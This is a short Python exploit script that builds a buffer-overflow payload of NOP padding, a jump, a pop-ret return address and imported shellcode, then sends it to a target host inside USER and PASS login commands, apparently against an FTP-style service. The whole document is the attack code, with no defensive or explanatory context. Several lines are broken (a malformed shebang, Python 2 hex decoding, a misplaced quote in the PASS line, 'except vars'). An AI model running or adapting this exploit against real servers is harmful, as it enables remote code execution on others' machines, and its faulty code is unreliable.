#/usr/bin/python
from payload import buf
import socket
import struct
import sys
def shell_attack(target_machine, target_port):

   doHavoc(target_machine,target_port)
   

def doHavoc(ipaddr,target_port):
   
    alignment = b"\x90"*3
    
    jmpfront = b"345A7504".decode('hex')
    
    popret = 0x10022ADE
    getEIPinEAX = b"D9EED934E48B44E40C040b".decode('hex')
  
    payload = alignment + b"."*(600-len(alignment)-len(jmpfront)) + jmpfront + struct.pack(b"<L", popret) + buf
    try:
        s = socket.create_connection((ipaddr, target_port))
        s.send(b"USER "+ payload +b"\r\n" )
      
        
        s.send(b"PASS "+ payload +"b\r\n" )
       
    except vars:
        
        sys.exit()
            

    